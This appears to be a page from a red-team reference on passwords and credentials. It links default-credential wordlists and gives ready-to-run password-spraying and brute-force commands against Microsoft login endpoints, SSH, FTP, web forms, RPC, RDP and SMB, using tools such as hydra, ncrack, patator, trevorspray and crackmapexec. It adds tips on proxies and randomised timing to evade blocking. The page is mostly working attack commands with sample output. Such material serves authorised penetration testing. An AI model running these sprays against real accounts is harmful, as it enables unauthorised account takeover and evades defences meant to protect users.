<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Passwords and Credentials
### References
* <details><summary>References (Click to expand)</summary><p>

### Reconnaissance

* [Gather Credentials TTP](TTP/T1589_Gather_Victim_Identity_Information/001_Credentials/T1589.001.md)

### Wordlists
* <details><summary>Default Credentials (Click to expand)</summary><p>
	* [https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
	* Seclists List of Default Credential Files -<br />[https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
	* Tomcat
		* [https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown)

### Default Accounts, Credentials
* Default Accounts, Credentials ([TTP](TTP/T1078_Valid_Accounts/001_Default_Accounts/T1078.001.md))
* Guessable ([TTP](TTP/T1110_Brute_Force/001_Password_Guessing/T1110.001.md))
* Forged ([TTP](TTP/T1606_Forge_Web_Credentials/T1606.md))
* Credentials in Files ([TTP](TTP/T1552_Unsecured_Credentials/001_Credentials_In_Files/T1552.001.md))

### Bruteforce, Password Spray ([`Brute Force - Password Spraying` TTP](TTP/T1110_Brute_Force/003_Password_Spraying/T1110.003.md))
* External Proxies
	* Overview
		* When spraying, it's easy for your source to be blocked. Proxies help prevent blocking
	* Tools
		* trevorproxy [https://github.com/blacklanternsecurity/trevorproxy](https://github.com/blacklanternsecurity/trevorproxy)
		* fireprox [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox)
* Email
	* Microsoft Outlook (MSOL)
		* <details><summary>Recommended: Trevorspray (Click to expand) -<br />[https://github.com/blacklanternsecurity/TREVORspray](https://github.com/blacklanternsecurity/TREVORspray)</summary><p>
			* Overview
				* Automatically uses trevorproxy
			* Examples
				* Collect domain public endpoint information

						trevorspray.py --recon <public_domain_name.tld>
				* Spray password list against discovered usernames

						trevorspray.py -e emails.txt -p <Fall2021!> --url <https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token>
					* `--delay <minutes>` - Set interval between attempts
		* PowerShell
			* <details><summary>drafthack GitHub: MSOL Spray (Click to expand) -<br />[https://github.com/dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray)</summary><p>
				* Overview
					* Open a PowerShell terminal with the command: `powershell.exe -exec bypass`
				* Examples

						Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
* SSH
	* <details><summary>hydra (Click to expand)</summary><p>
		* SSH 1

				hydra -l <username> -p <password> ssh://ip_address:22
		* SSH 2

				hydra -l <username> -P <password_list> -t <threads> <ip_address> ssh -s 22
	* <details><summary>Patator (Click to expand)</summary><p>
		* Example

				patator ssh_login host=<ip_address> port=<port> user=<username> password=FILE0 0=<password_wordlist> persistent=0 -x ignore:mesg='Authentication failed'
			* `persistent=0` - slower, but fewer false positives
			* `-x` - optional but supresses error messages.
* FTP
	* <details><summary>ncrack (Click to expand) -<br />([https://nmap.org/ncrack/](https://nmap.org/ncrack/), [https://github.com/nmap/ncrack](https://github.com/nmap/ncrack))</summary><p>
		* References
			* ncrack man page -<br />[https://nmap.org/ncrack/man.html](https://nmap.org/ncrack/man.html)
		* Parameters
			* Supported Protocols (specified via `<protocol>`):
				* SSH
				* RDP
				* FTP
				* Telnet
				* HTTP(S)
				* POP3(S)
				* IMAP
				* SMB
				* VNC
				* SIP Redis
				* PostgreSQL
				* MySQL
				* MSSQL
				* MongoDB
				* Cassandra
				* WinRM
				* OWA
		* Examples
			* Specify one protocol for all targets

					ncrack -u <username> -P <password_list_file> -p <protocol> <ip_address>

			* Specify protocol and port per target

					ncrack --user <username> -P <password_list_file> <protocol>://<ip_address>:<port>
			* Multiple Targets

					ncrack domain.local:21 ssh://10.10.*.*:1234 ftp://<ip_address>
* HTTP/S
	* Burpsuite's Intruder ([Burpsuite Tool Guide](Testaments_and_Books/Redvelations/Tools/Web/Burpsuite/burpsuite.md))
	* <details><summary>Patator (Click to expand)</summary><p>
		* Examples
			* Example 1

					patator.py http_fuzz url=https://gateway.example.com/oab/ user_pass=FILE0:FILE1 0=logins.txt 1=passwords.txt timeout=1 --max-retries=0 auth_type=ntlm 2>&1 | tee -a log
	* <details><summary>Hydra (Click to expand)</summary><p>
		* Parameters
			* `S` - https secure connection
			* `l` - "login" name
			* `P` - password wordlist
			* `p` - password
		* Examples
			* Example 1

					hydra -P <wordlist> -S -t  25 -l <username> "https-form-post://<ip_address>/index.php:password=^PASS^&login=Log+In&proc_login=true:incorrect password"
			* Example 2

					hydra -l admin -p /usr/share/wordlists/seclists/Passwords/10k_most_common.txt <ip_address> http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
			* Example 3

					hydra -P <wordlist> -S -t  25 -l <username> "https-form-post://10.10.10.43/db/index.php:password=^PASS^&login=Log+In&proc_login=true:incorrect password"
* RPC
	* <details><summary>rpcclient (Click to expand)</summary><p>
		* Example 1

				for user in $(cat users.txt); do password=Password1; echo -n "$user:$password:" && rpcclient -U "$user%$password" -c "getusername;quit" evilcorp.local; done | tee -a spray.log | grep -vi failure
			* NOTE: This sometimes reports "`NT_STATUS_LOGON_FAILURE`" even with a correct password!
		* Example 2: More stealthy (shuffles usernames & sleeps randomly)

			for user in $(cat users.txt | shuf); do password=Password1; echo -n "$user:$password:" && rpcclient -U "$user%$password" -c "getusername;quit" evilcorp.local; sleep $(($RANDOM % 10)); done
* RDP
	* <details><summary>xfreerdp (Click to expand)</summary><p>

			for user in $(cat users.txt); do password=Password1; echo -n "$user:$password:" xfreerdp +auth-only /cert-ignore /client-hostname:inconspicuous "/u:$user" "/p:$password" /v:dc01.evilcorp.local | tee -a log.txt | grep -o LOGON_FAILURE || echo SUCCESS; done
	* <details><summary>ncrack (Click to expand) -<br />([https://nmap.org/ncrack/](https://nmap.org/ncrack/), [https://github.com/nmap/ncrack](https://github.com/nmap/ncrack))</summary><p>
		* References
			* ncrack man page -<br />[https://nmap.org/ncrack/man.html](https://nmap.org/ncrack/man.html)
		* Parameters
			* Supported Protocols (specified via `<protocol>`):
				* SSH
				* RDP
				* FTP
				* Telnet
				* HTTP(S)
				* POP3(S)
				* IMAP
				* SMB
				* VNC
				* SIP Redis
				* PostgreSQL
				* MySQL
				* MSSQL
				* MongoDB
				* Cassandra
				* WinRM
				* OWA
		* Examples
			* Specify one protocol for all targets

					ncrack -u <username> -P <password_list_file> -p <protocol> <ip_address>

			* Specify protocol and port per target

					ncrack --user <username> -P <password_list_file> <protocol>://<ip_address>:<port>
			* Multiple Targets

					ncrack domain.local:21 ssh://10.10.*.*:1234 ftp://<ip_address>
* SMB
	* <details><summary>crackmapexec (Click to expand) -<br />([crackmapexec Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/CrackMapExec.md))</summary><p>

			crackmapexec -t 1 smb 10.0.0.2 -u users.txt -p Password1 --ufail-limit 1 --continue-on-success
		* Example Output

				$ cme -t 1 smb 10.0.0.2 -u users.txt -p Password1 --ufail-limit 1 --continue-on-success
				SMB         10.0.0.2      445    DC1              [*] Windows Server 2016 Standard 14393 x64 (name:DC1) (domain:EVILCORP) (signing:True) (SMBv1:True)
				SMB         10.0.0.2      445    DC1              [-] EVILCORP\asdf1:Password1 STATUS_LOGON_FAILURE 
				SMB         10.0.0.2      445    DC1              [-] EVILCORP\asdf2:Password1 STATUS_LOGON_FAILURE 
				SMB         10.0.0.2      445    DC1              [-] EVILCORP\asdf3:Password1 STATUS_LOGON_FAILURE 
				SMB         10.0.0.2      445    DC1              [+] EVILCORP\bob:Password1 
				SMB         10.0.0.2      445    DC1              [-] EVILCORP\asdf4:Password1 STATUS_LOGON_FAILURE 
				SMB         10.0.0.2      445    DC1              [-] EVILCORP\asdf5:Password1 STATUS_LOGON_FAILURE 
				SMB         10.0.0.2      445    DC1              [-] EVILCORP\asdf10:Password1 STATUS_LOGON_FAILURE 


### Needs Research
* <details><summary>Finger (Click to expand)</summary><p>

		finger 'a b c d e f g h' @example.com
		finger admin@example.com
		finger user@example.com
		finger 0@example.com
		finger .@example.com
		finger **@example.com
		finger test@example.com
		finger @example.com